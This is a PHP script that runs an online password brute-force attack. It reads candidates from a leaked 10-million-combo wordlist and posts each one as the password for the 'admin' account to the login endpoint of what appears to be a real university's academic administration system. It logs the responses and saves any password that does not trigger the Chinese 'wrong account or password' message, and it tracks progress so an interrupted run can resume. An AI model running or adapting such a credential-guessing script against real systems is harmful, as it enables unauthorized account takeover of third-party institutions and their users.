<?php
// https://www.cnblogs.com/bonelee/p/9323488.html

include dirname(__FILE__).'/autoload.php';

$outDir = dirname(__FILE__).'/out';
$result = fopen($outDir.'/dict_result.txt', 'a');

// http://download.g0tmi1k.com/wordlists/large/10-million-combos.zip
$in = fopen("D:\\data\\10-million-combos\\10-million-combos.txt", "r");
// $in = fopen("/home/mzh/pwdScanner/data/10-million-combos.txt", "r");
// $in = fopen("D:\\data\\10-million-combos\\outs\\0.log", "r");
$beginLinePath = $outDir.'/dict_begin.txt';
$lineNum = 100;
// 如果有记录上次执行到的行 从上次开始 覆盖$lineNum
if (is_file($beginLinePath)) {
    $beginLineFp = fopen($beginLinePath, 'r');
    $s = fread($beginLineFp, 32);
    if (!empty($s)) {
        $lineNum = intval($s);
    }
    // var_dump($lineNum); die;
    fclose($beginLineFp);
}
$beginLineFp = fopen($beginLinePath, 'w');

printf("Seeking to line %d\n", $lineNum);
$in = File::seekLine($in, $lineNum);

while (($line = fgets($in, 1024)) !== false) {
    $line = rtrim($line, "\r\n");
    $a = explode("\t", $line);
    $pwd = $a[1];

    $client = new RequestClient();
    $client->setUrl("http://jwxt.cqrk.edu.cn:18080/Logon.do?method=logonByDxfz");

    $account = "admin";
    Logger::write($account."\t".$pwd);

    $client->post(RequestClient::params([
        'userAccount' => $account,
        'userPassword' => $pwd
    ]));
    $resp = $client->getResponseBody();
    Logger::write($client->getResponseBody());

    if (strcmp($resp, "账号或密码输入错误!")===0) {
        echo $account."\t".$pwd."\t错误\n";
    } else{
        echo $pwd.'密码正确';
        fwrite($result, $account."\t".$pwd."\r\n");
    }
    $lineNum += 1;
    ftruncate($beginLineFp, 0);
    fseek($beginLineFp, 0);
    fwrite($beginLineFp, sprintf("%d", $lineNum));
}

fclose($result);




